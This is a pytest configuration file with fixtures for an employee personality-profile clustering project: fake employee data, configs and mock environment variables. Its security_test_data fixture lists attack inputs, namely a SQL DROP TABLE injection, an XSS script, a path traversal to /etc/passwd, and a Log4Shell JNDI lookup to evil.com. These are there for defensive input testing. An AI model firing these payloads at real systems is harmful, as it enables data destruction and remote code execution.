```python
"""Pytest configuration and shared fixtures."""

import os
import tempfile
from pathlib import Path
from typing import Any, Dict, Generator

import numpy as np
import pandas as pd
import pytest
import yaml
from faker import Faker
from sklearn.preprocessing import MinMaxScaler

# Set up faker for reproducible test data
fake = Faker()
Faker.seed(0)


@pytest.fixture(scope="session")
def test_data_dir() -> Path:
    """Provide path to test data directory."""
    return Path(__file__).parent / "fixtures"


@pytest.fixture(scope="session")
def sample_insights_data() -> pd.DataFrame:
    """Generate sample Insights Discovery data for testing."""
    data = []
    for i in range(100):
        data.append({
            "employee_id": f"EMP{i+1:03d}",
            "name": fake.name(),
            "department": fake.random_element(
                elements=("Engineering", "Marketing", "Sales", "HR", "Finance")
            ),
            "red_energy": fake.random_int(min=0, max=100),
            "blue_energy": fake.random_int(min=0, max=100),
            "green_energy": fake.random_int(min=0, max=100),
            "yellow_energy": fake.random_int(min=0, max=100),
            "fiery_red": fake.random_int(min=0, max=100),
            "cool_blue": fake.random_int(min=0, max=100),
            "earth_green": fake.random_int(min=0, max=100),
            "sunshine_yellow": fake.random_int(min=0, max=100),
            "thinking_preference": fake.random_element(
                elements=("Analytical", "Practical", "Conceptual", "Creative")
            ),
            "communication_style": fake.random_element(
                elements=("Direct", "Inspiring", "Harmonious", "Reflective")
            ),
        })
    return pd.DataFrame(data)


@pytest.fixture(scope="session")
def large_insights_data() -> pd.DataFrame:
    """Generate large dataset for performance testing."""
    np.random.seed(42)
    size = 5000
    
    data = {
        "employee_id": [f"EMP{i:05d}" for i in range(1, size + 1)],
        "cool_blue": np.random.randint(10, 60, size),
        "earth_green": np.random.randint(10, 60, size),
        "sunshine_yellow": np.random.randint(10, 60, size),
        "fiery_red": np.random.randint(10, 60, size),
        "red_energy": np.random.randint(0, 100, size),
        "blue_energy": np.random.randint(0, 100, size),
        "green_energy": np.random.randint(0, 100, size),
        "yellow_energy": np.random.randint(0, 100, size),
    }
    return pd.DataFrame(data)


@pytest.fixture
def sample_csv_file(tmp_path: Path, sample_insights_data: pd.DataFrame) -> Path:
    """Create a temporary CSV file with sample data."""
    csv_file = tmp_path / "sample_insights.csv"
    sample_insights_data.to_csv(csv_file, index=False)
    return csv_file


@pytest.fixture
def temp_csv_file(sample_insights_data: pd.DataFrame) -> Generator[str, None, None]:
    """Create a temporary CSV file with test data."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False) as f:
        sample_insights_data.to_csv(f.name, index=False)
        yield f.name
    os.unlink(f.name)


@pytest.fixture
def temp_dir() -> Generator[str, None, None]:
    """Create a temporary directory for test outputs."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


@pytest.fixture
def temp_work_dir() -> Generator[Path, None, None]:
    """Provide a temporary working directory."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        yield Path(tmp_dir)


@pytest.fixture
def sample_config() -> Dict[str, Any]:
    """Provide sample configuration for testing."""
    return {
        "clustering": {
            "algorithm": "kmeans",
            "n_clusters": 4,
            "random_state": 42,
            "max_iter": 300,
        },
        "data": {
            "anonymize": True,
            "validation_level": "strict",
            "retention_days": 180,
        },
        "simulation": {
            "iterations": 100,
            "team_size_range": [3, 8],
        },
        "output": {
            "format": "json",
            "include_visualizations": True,
            "export_clusters": True,
        },
        "security": {
            "encrypt_data": True,
            "log_access": True,
        },
        "privacy": {
            "anonymize_data": True,
            "retention_days": 180,
        },
    }


@pytest.fixture
def mock_config() -> dict:
    """Mock configuration for testing."""
    return {
        "clustering": {
            "algorithm": "kmeans",
            "n_clusters": 5,
            "random_state": 42,
        },
        "simulation": {
            "iterations": 100,
            "team_size_range": [3, 8],
        },
        "output": {
            "format": "json",
            "include_visualizations": True,
        },
        "privacy": {
            "anonymize_data": True,
            "retention_days": 180,
        },
    }


@pytest.fixture
def sample_config_file(tmp_path: Path, sample_config: Dict[str, Any]) -> Path:
    """Create a temporary configuration file."""
    config_file = tmp_path / "config.yml"
    with open(config_file, "w") as f:
        yaml.dump(sample_config, f)
    return config_file


@pytest.fixture
def mock_env_vars(monkeypatch: pytest.MonkeyPatch) -> None:
    """Set up mock environment variables for testing."""
    test_env = {
        "APP_ENV": "testing",
        "DEBUG": "true",
        "LOG_LEVEL": "DEBUG",
        "SECRET_KEY": "test-secret-key",
        "DATA_RETENTION_DAYS": "30",
        "ENABLE_ANONYMIZATION": "true",
        "CLUSTERING_ALGORITHM": "kmeans",
        "DEFAULT_CLUSTERS": "4",
        "RANDOM_SEED": "42",
        "PYTHONPATH": str(Path(__file__).parent.parent / "src"),
        "TEST_MODE": "true",
    }
    
    for key, value in test_env.items():
        monkeypatch.setenv(key, value)


@pytest.fixture(autouse=True)
def setup_test_environment(monkeypatch):
    """Set up test environment variables."""
    monkeypatch.setenv("PYTHONPATH", str(Path(__file__).parent.parent / "src"))
    monkeypatch.setenv("TEST_MODE", "true")
    monkeypatch.setenv("LOG_LEVEL", "DEBUG")


@pytest.fixture
def large_dataset() -> pd.DataFrame:
    """Generate a large dataset for performance testing."""
    data = []
    for _ in range(10000):
        data.append({
            "employee_id": fake.uuid4(),
            "red_energy": fake.random_int(min=0, max=100),
            "blue_energy": fake.random_int(min=0, max=100),
            "green_energy": fake.random_int(min=0, max=100),
            "yellow_energy": fake.random_int(min=0, max=100),
        })
    return pd.DataFrame(data)


@pytest.fixture
def malformed_data() -> pd.DataFrame:
    """Generate malformed data for error testing."""
    return pd.DataFrame({
        "employee_id": [1, 2, None, 4, 5],
        "red_energy": ["invalid", 50, 75, None, 100],
        "blue_energy": [25, 50, 75, 100, "error"],
        "green_energy": [None, None, None, None, None],
        "yellow_energy": [-10, 150, 50, 75, 100],  # Invalid range
    })


@pytest.fixture(autouse=True)
def setup_test_logging(caplog: pytest.LogCaptureFixture) -> None:
    """Configure logging for tests."""
    import logging
    
    # Set log level to capture all messages during testing
    caplog.set_level(logging.DEBUG)


@pytest.fixture
def security_test_data() -> Dict[str, Any]:
    """Provide data for security testing."""
    return {
        "pii_data": {
            "employee_id": "123-45-6789",  # SSN format
            "name": "John Doe",
            "email": "john.doe@company.com",
            "phone": "+1-555-123-4567",
        },
        "injection_attempts": [
            "'; DROP TABLE employees; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
        ],
        "large_payload": "A" * 1000000,  # 1MB of data
    }


@pytest.fixture
def mock_clustering_result():
    """Mock clustering result for testing."""
    return {
        "labels": np.array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0]),
        "centers": np.array([[30, 25, 35, 20], [40, 30, 25, 35], [25, 40, 30, 25]]),
        "inertia": 1234.56,
        "n_clusters": 3,
    }


class MockInsightsData:
    """Mock class for Insights Discovery data operations."""
    
    def __init__(self, data: pd.DataFrame):
        self.data = data
    
    def validate(self) -> bool:
        """Mock validation method."""
        required_columns = {"cool_blue", "earth_green", "sunshine_yellow", "fiery_red"}
        return required_columns.issubset(set(self.data.columns))
    
    def normalize(self) -> pd.DataFrame:
        """Mock normalization method."""
        numeric_columns = ["cool_blue", "earth_green", "sunshine_yellow", "fiery_red"]
        scaler = MinMaxScaler()
        normalized_data = self.data.copy()
        normalized_data[numeric_columns] = scaler.fit_transform(
            self.data[numeric_columns]
        )
        return normalized_data


@pytest.fixture
def mock_insights_data(sample_insights_data: pd.DataFrame) -> MockInsightsData:
    """Create a mock insights data object."""
    return MockInsightsData(sample_insights_data)


# Performance testing fixtures
@pytest.fixture
def benchmark_config() -> Dict[str, Any]:
    """Configuration for benchmark tests."""
    return {
        "min_rounds": 3,
        "max_time": 10.0,
        "warmup": True,
        "disable_gc": True,
    }


# Markers for different test types
def pytest_configure(config: pytest.Config) -> None:
    """Configure custom pytest markers."""
    markers = [
        "unit: Unit tests",
        "integration: Integration tests", 
        "e2e: End-to-end tests",
        "performance: Performance tests",
        "security: Security tests",
        "slow: Slow running tests",
    ]
    
    for marker in markers:
        config.addinivalue_line("markers", marker)


# Test data cleanup
def pytest_runtest_teardown(item: pytest.Item) -> None:
    """Clean up after each test."""
    # Clean up any temporary files or data
    pass


@pytest.fixture(autouse=True)
def cleanup_test_artifacts():
    """Clean up test artifacts after each test."""
    yield
    # Clean up any temporary files or directories created during tests
    test_artifacts = [
        "test_output.json",
        "test_clusters.png",
        "test_report.html",
    ]
    for artifact in test_artifacts:
        if os.path.exists(artifact):
            os.remove(artifact)


# Custom test collection
def pytest_collection_modifyitems(
    config: pytest.Config, items: list[pytest.Item]
) -> None:
    """Modify test collection to add markers based on file location."""
    for item in items:
        # Add markers based on test file location
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "security" in str(item.fspath):
            item.add_marker(pytest.mark.security)
        
        # Mark slow tests
        if "test_large" in item.name or "performance" in str(item.fspath):
            item.add_marker(pytest.mark.slow)
```
